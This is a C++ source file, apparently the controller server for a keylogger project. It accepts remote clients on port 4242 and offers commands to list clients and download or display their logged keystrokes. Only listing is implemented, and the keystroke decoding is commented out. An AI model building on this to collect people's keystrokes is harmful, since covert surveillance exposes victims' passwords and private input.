#include <iostream>
#include <string>
#include <functional>
#include <map>

#include "TCPServer.h"
#include "TCPClient.hpp"
#include "Protocol.hpp"

int main(int argc, char **argv)
{
  TCPServer server;
  std::vector<TCPClient*> clientsList;
  char buffer[sizeof(t_proto)];
  char cmd_buffer[255];

  fcntl(0, F_SETFL, fcntl(0, F_GETFL) | O_NONBLOCK);
  server.listenClients("127.0.0.1", "4242", 3);
  std::cout << "Available commands:" << std::endl;
  std::cout << "LIST : List connected clients ID." << std::endl;
  std::cout << "DOWNLOAD [ID] : Download keystroke for client ID." << std::endl;
  std::cout << "DISPLAY [ID] : Display loged keystroke for client ID." << std::endl;
  std::cout << "CLOSE [ID] : Close client ID." << std::endl;
  while (server.isListening())
    {
      int size = read(0,&cmd_buffer,254);
      if (size > 0)
	{
	  if (cmd_buffer[size - 1] == '\n')
	    size -= 1;
	  cmd_buffer[size] = '\0';
	  std::cout << "COMMAND: " << cmd_buffer << std::endl;
	  if (std::string(cmd_buffer) == std::string("LIST"))
	    {
	      unsigned int pos = 0;
	      std::cout << "CLIENTS AVAILABLE: " << std::endl;
	      auto list = server.getClientsSocketList();
	      for (auto it = list.begin(); it != list.end() ; it ++)
		{
		  if ((*it) != 0)
		    std::cout << "Client with id " << pos << " available" << std::endl;
		  pos ++;
		}
	    }
	  if (std::string(cmd_buffer) == std::string("EXIT"))
	    {
	      exit(0);
	    }
	}
      server.waitForClientsActivity();
      if (server.incomingConnection())
	{
	  TCPClient* client = server.getIncomingCLient();
	  clientsList.push_back(client);
	}
      for (auto clientIt = clientsList.begin(); clientIt != clientsList.end(); clientIt++)
	{
	  if (server.checkSocket(*clientIt))
	    {
	      int read = 0;
	      if ((read = ((*clientIt)->receiveData(buffer, sizeof(t_proto)))) == 0)
		{
		  std::cout << "Client disconected" << std::endl;
		  server.disconectClient(*clientIt);
		}
	      else
		{
		  /*if (read == sizeof(t_proto))
		    {
		    t_proto *data = reinterpret_cast<t_proto *>(buffer);
		    if (data->source == eventSource::KEYBOARD)
		    {
		    std::cout << "Client key ";
		    if (m_keycode2name.find(data->button_code) != m_keycode2name.end())
		    std::cout << m_keycode2name.at(data->button_code);
		    else
		    std::cout << "unknown";
		    std::cout << (data->key_status == m_keycodeStatus::DOWN ? " pressed" : " released");
		    std::cout << " on client" << std::endl;
		    }
		    }*/
		}
	    }
	}
    }
  return (0);
}
